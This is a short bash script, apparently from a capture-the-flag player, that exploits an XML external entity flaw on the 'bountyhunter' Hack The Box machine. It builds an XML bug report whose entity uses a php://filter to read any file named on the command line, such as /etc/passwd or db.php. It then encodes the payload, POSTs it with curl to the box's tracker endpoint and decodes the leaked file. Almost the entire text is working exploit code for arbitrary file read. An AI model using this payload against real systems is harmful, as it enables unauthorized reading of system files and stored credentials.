#!/usr/bin/env bash
#xxe exploit for bountyhunter htb box
#LoRKa · pax0r.com

if [ "$#" -ne "1" ] || [ "$#" -gt "1" ] ; then
echo '[+] Use: '$0' "/etc/passwd"'
echo '[+] Use: '$0' "db.php"'
    exit -1
    fi

trap 'rm -rf "${PAYLOAD}" "${TMPFILE}"' EXIT

PAYLOAD=$(mktemp)
TMPFILE=$(mktemp)
ARGUMENT=${1}

#urlencode function https://github.com/SixArm/urlencode.sh/blob/main/urlencode.sh
urlencode() {

    old_lang=$LANG
    LANG=C

    old_lc_collate=$LC_COLLATE
    LC_COLLATE=C

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%%%02X' "'$c" ;;
        esac
    done

    LANG=$old_lang
    LC_COLLATE=$old_lc_collate
}


payload(){
cat << EOF > ${PAYLOAD}
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=${ARGUMENT}" >]>
                <bugreport>
                <title>&xxe;</title>
                <cwe>d3l3t3m3</cwe>
                <cvss>d3l3t3m3</cvss>
                <reward>d3l3t3m3</reward>
                </bugreport>
EOF
}


#make payload
payload

#encode
echo "data=" > ${TMPFILE}
urlencode $(base64 ${PAYLOAD} -w 0) >> ${TMPFILE}

#run POST
curl -s -d @${TMPFILE} http://bountyhunter.htb/tracker_diRbPr00f314.php |\
grep -vw 'If DB were ready\|d3l3t3m3\|Title:\|CWE:\|Score:\|Reward:' |\
sed 's/<[^>]*>//g' | sed '/^ *$/d' | sed "s/^[ \t]*//" | base64 -d
